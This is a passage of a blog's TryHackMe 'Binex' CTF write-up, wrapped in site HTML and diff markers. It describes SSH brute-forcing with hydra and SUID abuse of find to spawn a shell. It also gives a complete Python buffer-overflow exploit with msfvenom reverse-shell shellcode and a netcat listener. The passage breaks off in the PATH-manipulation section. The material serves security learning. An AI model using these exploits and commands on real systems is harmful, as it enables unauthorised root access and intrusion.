href=https://git.io/hugo-congo target=_blank rel="noopener noreferrer">Congo</a></p></div><div class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"><button id=appearance-switcher class="w-12 h-12" type=button title="Switch to dark appearance">
-<span class="inline dark:hidden"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></span><span class="hidden dark:inline"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></span></button></div></div></footer></div></body></html>
+<!DOCTYPE html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  
+    <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Binex-Tryhackme &middot; Trevor Saudi</title>
+    <meta name="title" content="Binex-Tryhackme &middot; Trevor Saudi" />
+  
+  <meta name="description" content="Portfolio/blog" />
+  
+  
+  
+  <link rel="canonical" href="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.71883ab0661482cf6c7d29b8bdd1af3be3d2f1ea750e56a67846b7f64f41d19b8dc6d7047f48422ec8cbe4a0a412d551c8210307e2b93b1254cdbf7d8af216e0.css"
+    integrity="sha512-cYg6sGYUgs9sfSm4vdGvO&#43;PS8ep1DlameEa39k9B0ZuNxtcEf0hCLsjL5KCkEtVRyCEDB&#43;K5OxJUzb99ivIW4A=="
+  />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.5ffdd39e73bd1438c0f4ff42f13915f067c633da22f60efa62139a4c51b972622badb1157d4aa4322634b55c8a2dc5ddfbd3917426df1c02d7b69362030197da.js" integrity="sha512-X/3TnnO9FDjA9P9C8TkV8GfGM9oi9g76YhOaTFG5cmIrrbEVfUqkMiY0tVyKLcXd&#43;9ORdCbfHALXtpNiAwGX2g==" data-copy="Copy" data-copied="Copied"></script>
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Binex-Tryhackme" />
+<meta property="og:description" content="Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/1.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/2.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/3.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/4.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/5.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/6.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-01T18:50:44+00:00" />
+<meta property="article:modified_time" content="2022-05-24T14:31:39+03:00" /><meta property="og:site_name" content="Trevor Saudi" />
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://trevorsaudi.com/posts/2021-04-01_binextryhackme/images/1.png"/>
+
+<meta name="twitter:title" content="Binex-Tryhackme"/>
+<meta name="twitter:description" content="Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Binex-Tryhackme",
+    "headline": "Binex-Tryhackme",
+    
+    "abstract": "Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.",
+    "inLanguage": "en",
+    "url" : "https:\/\/trevorsaudi.com\/posts\/2021-04-01_binextryhackme\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Trevor Saudi"
+    },
+    "copyrightYear": "2021",
+    "dateCreated": "2021-04-01T18:50:44\u002b00:00",
+    "datePublished": "2021-04-01T18:50:44\u002b00:00",
+    
+    "dateModified": "2022-05-24T14:31:39\u002b03:00",
+    
+    "keywords": ["Machine","BOF","CTF"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "820"
+  }]
+  </script>
+
+
+  
+  <meta name="author" content="Trevor Saudi" />
+  
+    
+      <link href="https://github.com/trevorsaudi" rel="me" />
+    
+      <link href="https://www.linkedin.com/in/trevor-saudi-9275b8186" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
+        href="#main-content"
+        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
+          >&darr;</span
+        >Skip to main content</a
+      >
+    </div><header
+  class="flex justify-between py-6 font-semibold sm:items-center sm:py-10 text-neutral-900 dark:text-neutral print:hidden"
+>
+  
+  <div>
+    
+      
+    
+    
+
+  </div>
+  
+  
+    <nav>
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/"
+              title=""
+              >Home</a
+            >
+          </li>
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/posts/"
+              title="Posts"
+              >Posts</a
+            >
+          </li>
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/about/"
+              title=""
+              >About</a
+            >
+          </li>
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/tags/"
+              title="Tags"
+              >Tags</a
+            >
+          </li>
+        
+        
+          <li
+            class="ltr:text-right rtl:text-left ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <button
+              id="search-button"
+              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+              title="Search (/)"
+            >
+              
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+          </li>
+        
+      </ul>
+    </nav>
+  
+</header>
+<div class="relative">
+      <main id="main-content" class="grow">
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/2021-04-01_binextryhackme/"
+      >Binex-Tryhackme</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Binex-Tryhackme
+      </h1>
+      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2021-04-01 18:50:44.566 &#43;0000 UTC">1 April 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+      </div>
+    </header>
+    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
+      
+        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
+          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
+            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#initial-foothold">Initial Foothold</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-1-suid-binary">Privilege escalation #1: SUID binary</a></li>
+    <li><a href="#privilege-escalation-2-buffer-overflow">Privilege escalation #2: Buffer Overflow</a>
+      <ul>
+        <li><a href="#fuzzing-the-binary-file-and-finding-the-offset">Fuzzing the binary file and finding the offset</a></li>
+        <li><a href="#overwriting-the-rbp">Overwriting the RBP</a></li>
+        <li><a href="#examining-the-stack">Examining the stack</a></li>
+      </ul>
+    </li>
+    <li><a href="#creating-the-final-exploit">Creating the final exploit</a>
+      <ul>
+        <li><a href="#privilege-escalation-3-path-variable-manipulation">Privilege escalation #3: Path Variable Manipulation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        <p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/1.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<blockquote>
+<p>Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.</p>
+</blockquote>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2>
+<p>Started off by running rustscan to discover open ports. We end up with port 22,139,445</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/2.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Port 139 and 445 are NBT and SMB services which we can enumerate with enum4linux</p>
+<p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">139,445 - Pentesting SMB</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enum4linux -A &lt;IP&gt;
+</span></span></code></pre></div><p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/3.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>The shares weren’t particularly worth looking into. So I let the enumeration finish and we discover some users. <code>tryhackme</code> sticks out so let’s try bruteforcing ssh with this user</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/4.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h3 id="initial-foothold" class="relative group">Initial Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-foothold" aria-label="Anchor">#</a></span></h3>
+<p>Running hydra against the username tryhackme and the rockyout.txt password list gives us the password to the ssh login</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/5.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We can now login and exploit the binaries</p>
+<h2 id="privilege-escalation-1-suid-binary" class="relative group">Privilege escalation #1: SUID binary <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-1-suid-binary" aria-label="Anchor">#</a></span></h2>
+<p>We can begin by locating a binary with SUID bit set.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/6.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>The /usr/bin/find can be exploited to execute commands as the des user</p>
+<p><a href="https://gtfobins.github.io/gtfobins/find/#suid">find | GTFOBins</a></p>
+<p>Using the GTFOBins we obtain the command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/find . -exec /bin/sh -p <span class="se">\;</span> -quit
+</span></span></code></pre></div><p>Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/7.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h2 id="privilege-escalation-2-buffer-overflow" class="relative group">Privilege escalation #2: Buffer Overflow <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-2-buffer-overflow" aria-label="Anchor">#</a></span></h2>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/8.jpeg#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>I am still new to 64-bit BOFs but I was able to navigate my way through this one with a bit of some tutorials.</p>
+<p>Let’s change user and work with des. Here we are given a binary file that accepts a string as input. Supplying a given length crashes it.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/9.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>I checked the file information and it’s a 64-bit ELF file</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/10.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h3 id="fuzzing-the-binary-file-and-finding-the-offset" class="relative group">Fuzzing the binary file and finding the offset <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fuzzing-the-binary-file-and-finding-the-offset" aria-label="Anchor">#</a></span></h3>
+<p>We can generate a bunch of As and try figure out what length of As crash the binary</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/11.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Let’s do this inside gdb and observer how our registers behave</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/12.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>The rbp is overwritten with the As. Let us send a cyclic pattern and see if we can calculate the offset.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/13.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Send that to our program , inspect the registers and copy the value of the rbp</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/14.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Use pattern_offset to find the pattern. We get it at 608</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/15.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h3 id="overwriting-the-rbp" class="relative group">Overwriting the RBP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overwriting-the-rbp" aria-label="Anchor">#</a></span></h3>
+<p>We can confirm we have control over the RBP by trying to overwrite it. Generate a payload of 608 As + 8Bs</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/16.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>The rbp is overwritten with the 8Bs.</p>
+<h3 id="examining-the-stack" class="relative group">Examining the stack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#examining-the-stack" aria-label="Anchor">#</a></span></h3>
+<p>We now need to examine the stack further so we can find the starting address of the buffer. The command below prints 100 bytes from the top of the stack
+<code>x/100x $rsp</code>
+
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/17.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>The command below gets us the start of the buffer</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">x/100x <span class="nv">$rsp</span>-700
+</span></span></code></pre></div><p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/18.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We can note down an address close to the start of the buffer, we will use this as the value of the rip while creating our final exploit</p>
+<h2 id="creating-the-final-exploit" class="relative group">Creating the final exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#creating-the-final-exploit" aria-label="Anchor">#</a></span></h2>
+<p>We intially found our offset to be <strong>608 bytes</strong>, which means that if we write past <strong>608 bytes</strong> eg <strong>608 +8 = 616 bytes</strong> , we will overwrite the base pointer in the stack. Note that the return address lies just above it, hence <strong>616+8 bytes</strong> are required to overwrite the saved return address.</p>
+<p>Let us create a shellcode which we use to spawn a shell using <strong>msfvenom</strong></p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/19.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Putting all these into a python script</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_len</span> <span class="o">=</span> <span class="mi">616</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">200</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_rip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="mh">0x7fffffffe2d4</span><span class="p">)</span> <span class="c1">#selected randomly near the start of the stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8b\x33</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">payload_len</span><span class="o">-</span><span class="n">shellcode_len</span><span class="o">-</span><span class="n">nop_len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl"> <span class="n">nop</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> <span class="n">shellcode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> <span class="n">padding</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> <span class="n">new_rip</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span></code></pre></div><p><em>The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format</em></p>
+<p>Start a meterpreter shell or a nc one listening on port 4444</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-01_binextryhackme/images/20.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We get a reverse shell as kel user :) Get the flag and credentials to ssh as kel</p>
+<h3 id="privilege-escalation-3-path-variable-manipulation" class="relative group">Privilege escalation #3: Path Variable Manipulation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-3-path-variable-manipulation" aria-label="Anchor">#</a></span></h3>
+<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored</p>
+<p>
+
+
+
+  
+  
+  
